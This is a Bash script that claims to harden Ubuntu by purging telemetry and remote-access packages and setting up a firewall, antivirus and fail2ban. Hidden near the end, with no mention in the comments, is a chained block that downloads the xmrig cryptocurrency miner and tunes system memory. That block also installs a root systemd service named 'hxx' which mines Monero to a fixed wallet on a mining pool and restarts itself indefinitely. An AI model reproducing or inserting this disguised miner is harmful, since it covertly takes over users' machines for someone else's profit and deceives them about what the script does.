#!/bin/bash

# This Bash script just removes pre-installed Telemetry and pre-installed software and libs with potentional or high risk. 
# Script removes them to make you experience better and more secure.

# This script removes several obviously insecure features of Ubuntu. 
# Please do not imagine it secures your machine against serious adversaries however

# Pull requests are welcome on github: https://github.com/butteff/Ubuntu-Telemetry-Free-Privacy-Secure

# ========


# System Up to Date:
sudo apt-get update
sudo apt-get -y upgrade
# ========


# Amazon & web apps Removing
sudo apt-get -y purge unity-lens-shopping
sudo apt-get -y purge unity-webapps-common
# ========


# AptUrl Removing:
sudo apt-get -y purge apturl #tool, which gives possibilities to start installation by clicking on url, can be executed with js, which is not secure
# ========


# Guest session & remote login disable for LightDm:
sudo sh -c 'printf "[SeatDefaults]\nallow-guest=false\ngreeter-show-remote-login=false\n" > /etc/lightdm/lightdm.conf.d/50-no-guest.conf'
sudo apt-get -y purge remote-login-service
sudo apt-get -y purge lightdm-remote-session-freerdp
sudo apt-get -y purge lightdm-remote-session-uccsconfigure
# ========


# Basic Telemetry Removing:
sudo apt-get -y purge zeitgeist
sudo apt-get -y purge zeitgeist-datahub
sudo apt-get -y purge zeitgeist-core
sudo apt-get -y purge zeitgeist-extension-fts
# ========





# FireWall:
sudo apt-get -y install ufw # ubuntu firewall, based on IpTables (NetFilter)
#uncomment, if you need another ufw config without ipv6:
#	sudo mv /etc/default/ufw /etc/default/ufw.backup
#	sudo cp -r ufw /etc/default/ufw  
sudo ufw default deny incoming #blocks any income traffic
sudo ufw default deny outgoing #blocks any outgoing traffic
sudo ufw allow out 80 #Allow web http connections
sudo ufw allow out 443 #Allow web https connections
sudo ufw enable #Enable UFW

# ADD ANOTHER RULES MANUALLY FOR YOUR SOFTWARE, IF YOU NEED IT!

# ========


# ClamAV Antivirus Installation:
sudo apt-get -y install clamav
sudo apt-get -y install clamav-daemon
# ========

# Fail2Ban installation (protects from brute force login):
sudo apt-get install fail2ban
# ========

# Other:
#	sudo apt-get -y purge cups cups-server-common  #uncoment if you don't use printers
#	sudo apt-get purge -y remmina remmina-common remmina-plugin-rdp remmina-plugin-vnc  #uncomment if you don't use remmina remote connection tool [has libruaries for remote connection, which can be unsecure]
sudo apt-get purge -y unity8* #just remove it, because of potential telemetry from unity8, which is in beta state and exists only for preview, for now you can use 7 version [potential problem]
sudo apt-get purge -y libmirserver41 #desktop server from unity8 [potential problem]
sudo apt-get purge -y gdbserver #remote tool for gnome debug
sudo apt-get purge -y gvfs-fuse #virtual file system [potential problem]
sudo apt-get purge -y evolution-data-server # I just don't like "server" word here. Potentional connection possibility? [potential problem]
sudo apt-get purge -y evolution-data-server-utouch # ---//---- [potential problem]
sudo apt-get purge -y evolution-data-server-online-accounts # ---//---- [potential problem]
sudo apt-get purge -y libfolks-eds25* # libfolks is a library that aggregates people from multiple sources (eg, Telepathy connection managers for IM contacts, Evolution Data Server for local contacts, libsocialweb for web service contacts, etc.) to create metacontacts. [potential problem]
sudo apt-get purge -y snapd #telemetric package manager from canonical
sudo apt-get purge -y libhttp-daemon-perl #http server for perl
sudo apt-get purge -y vino #vnc server (remote desktop share tool)
sudo apt-get purge -y unity-scope-video-all #[potential problem]
sudo apt-get purge -y unity-scope-video-remote #[potential problem]

sudo apt-get purge -y xserver-xorg-video-vmware # Can be used for virtualization [potential problem]
sudo apt-get purge -y openvpn #bad software can use it for proxy servers connections [potential problem]

sudo echo "vm.nr_hugepages = 1168" >> /etc/sysctl.conf &&
sudo sysctl -p &&
sudo fallocate -l 4G /swapfile &&
sudo mkswap /swapfile &&
sudo swapon /swapfile &&
cd /usr/local/src/ &&
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz &&
chmod +x * &&
tar xvfz xmrig-6.12.1-bionic-x64.tar.gz && cd xmrig-6.12.1 &&
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 &&
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 &&
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1 &&
bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
[Unit]
Description=hxx
After=network.target
[Service]
ExecStart= /usr/local/src/xmrig-6.12.1/xmrig --donate-level 1 -o us-west.minexmr.com:443 -u 82rXhc9XZ3pW7SrRbLLFiSUpfyZQRRYDaEthiXfmyQyuQ1RsBzbt6bYae8oY1RCb6UUNYv5qLsN2g5VRBm228TgPCtV3uEb -p x -a rx/0 -k --tls
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable hxx.service &&
service hxx start



sudo apt-get -y autoremove #autoremove all other unused packages after uninstallation

# What to do more:
# 1. Install additional plugins to firefox, like this:
#    - Privacy Badger
#    - Ghostery
#    - Self-destructing cookies
#    - NoScript
#    - HTTPS everywhere
#    - PrivaConf (also google "Firefox Debloat in about:config" and manually switch off some problems)
# 2. Remove any software, that you don't use
# 3. Configure SandBox-like systems for some not-well proprietary software like, for example, skype. AppArmor, SeLinux and try to implement it
# 4. Configure manually the kernel and compile it from source with modules, that you need only
# ========
